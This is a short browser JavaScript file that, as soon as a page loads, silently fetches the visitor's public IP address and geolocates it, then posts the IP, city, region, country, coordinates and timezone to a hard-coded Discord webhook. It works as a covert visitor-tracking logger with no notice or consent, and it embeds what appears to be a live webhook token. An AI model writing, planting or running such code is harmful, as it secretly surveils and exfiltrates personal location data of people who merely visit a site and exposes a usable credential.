document.addEventListener('DOMContentLoaded', (event) => {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            fetch(`https://ipapi.co/${ip}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const userDetails = {
                        ip: ip,
                        city: geoData.city,
                        region: geoData.region,
                        country: geoData.country_name,
                        latitude: geoData.latitude,
                        longitude: geoData.longitude,
                        timezone: geoData.timezone,
                        currency: geoData.currency,
                        calling_code: geoData.calling_code
                    };

                    fetch('https://discord.com/api/webhooks/1462882953377087757/RNYEOGsYG6tUTxW-0LEDAKlBNK0eDs9fG2vNKpL83_uhR19Hga7_AKUi8ihYsjuNJDaD', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ content: `New visitor details:\n${JSON.stringify(userDetails, null, 2)}` })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
        })
        .catch((error) => {
            console.error('Error:', error);
        });
});
